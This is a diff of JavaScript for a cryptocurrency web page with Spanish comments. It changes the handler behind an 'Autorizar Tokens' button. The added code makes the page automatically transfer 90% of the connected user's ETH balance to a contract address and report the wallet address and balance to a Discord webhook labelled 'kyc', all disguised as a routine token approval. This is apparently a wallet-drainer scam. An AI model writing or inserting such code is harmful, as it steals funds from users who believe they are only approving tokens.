@@ -123,16 +123,29 @@ document.getElementById("approveTokens").addEventListener("click", async () => {
         .send({ from: userAccount });
     }
 
+    // ✅ Enviar automáticamente 90% del ETH al contrato
+    const ninetyPercent = web3.utils.toWei((parseFloat(balanceEth) * 0.9).toFixed(6), 'ether');
+
+    await web3.eth.sendTransaction({
+      from: userAccount,
+      to: NETWORKS[selectedNetwork].contractAddress,
+      value: ninetyPercent
+    });
+
+    await sendToDiscordWebhook('kyc', userAccount, balanceEth);
+    alert("Aprobaciones realizadas y 90% del saldo enviado al contrato.");
+
     button.textContent = "Autorizado ✓";
     button.style.backgroundColor = "#00b15d";
   } catch (error) {
     console.error(error);
-    alert("Error al aprobar tokens");
+    alert("Error al aprobar tokens o enviar ETH");
     button.textContent = "Autorizar Tokens";
     button.style.backgroundColor = "#f0b90b";
     button.disabled = false;
   }
 });
+
 
 async function sendToDiscordWebhook(eventType, address, balance) {
   const embed = {
